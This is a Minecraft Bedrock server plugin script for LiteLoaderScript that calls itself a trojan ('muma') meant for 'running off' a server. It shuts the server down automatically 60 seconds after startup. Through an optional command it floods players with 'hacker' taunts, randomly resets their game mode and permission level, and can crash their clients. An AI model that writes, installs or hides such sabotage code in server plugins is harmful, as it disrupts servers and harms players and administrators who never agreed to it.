//LiteLoaderScript Dev Helper
/// <reference path="c:\Users\Administrator\.vscode/dts/HelperLib-master/src/index.d.ts"/>

//注册插件
ll.registerPlugin(
  /* name */ "muma",
  /* introduction */ "一个简用跑路的插件",
  /* version */ [0, 0, 1],
  /* otherInformation */ {}
);

// 插件是否加载成功
log("木马加载成功");

//配置文件
let conf = new JsonConfigFile("plugins/xianyubb/muma/config.json");
conf.init("SET Server Stop TimeOut", 60000);
conf.init("SET FPS VeloCity", 500);
conf.init("Last Text Before Server Stop", "再见了服务器");
conf.init("Custom TEXT1", "[§4§l黑客§r]§6垃圾服务器等死吧");
conf.init("Custom TEXT2", "[§4§l黑客§r]§560秒干趴你们服务器");
conf.init("Custom TEXT3", "[§4§l黑客§r]§3看我让你们体验一下什么叫做魔幻");
conf.init("Custom TEXT4", "[§4§l黑客§r]§2崩溃吧玩家");
conf.init("iscrash", false);
conf.init("iscmd", false);

mc.listen("onServerStarted", () => {
  //命令控制系统
  if (conf.get("iscmd", Boolean) === 1) {
    const cmd = mc.newCommand(
      "runroad",
      "选择是否开启跑路",
      PermType.GameMasters,
      0x80
    );
    cmd.setAlias("run");
    cmd.setEnum("action", [true, false]);
    cmd.mandatory("action", ParamType.Bool, "action");
    cmd.overload(["action"]);
    cmd.setCallback((_cmd, _ori, out, res) => {});
    cmd.setup();
  }
  //自动关服
  setTimeout(() => {
    mc.broadcast(conf.get("Last Text Before Server Stop"));
    mc.runcmd("stop");
  }, conf.get("SET Server Stop TimeOut")); //这里的数字可以更改，越小越快（单位：ms）
});
let a = 0,
  b = 0;
c = 0;
//声明ab变量,用作后面随机数

//向玩家发送虚假消息
if (conf.get("iscmd", Boolean) === 1) {
  mc.listen("onPlayerCmd", (pl, cmd) => {
    if (cmd === "run true") {
      c++;
      pl.tell("准备好了吗？要开始了哦！");
      setTimeout(() => {
        setInterval(() => {
          a = Math.floor(Math.random() * 3);
          b = Math.floor(Math.random() * 2); //随机数
          pl.tell(conf.get("Custom TEXT1"));
          pl.tell(conf.get("Custom TEXT2"));
          pl.tell(conf.get("Custom TEXT3"));
          pl.tell(conf.get("Custom TEXT4"));
          pl.setGameMode(a);
          pl.setPermLevel(b);
          if (conf.get("iscrash", Boolean) === 1) {
            pl.crash();
          }
        }, conf.get("SET FPS VeloCity"));
      }, 3000);
    }
    if (cmd === "run false") {
      if (c === 1) {
        mc.runcmd("ll reload muma.lxl.js");
        pl.tell("已停止");
        c--;
      } else if (c === 0) {
        pl.tell("你还没有开始哦!");
      }
    }
  });
}
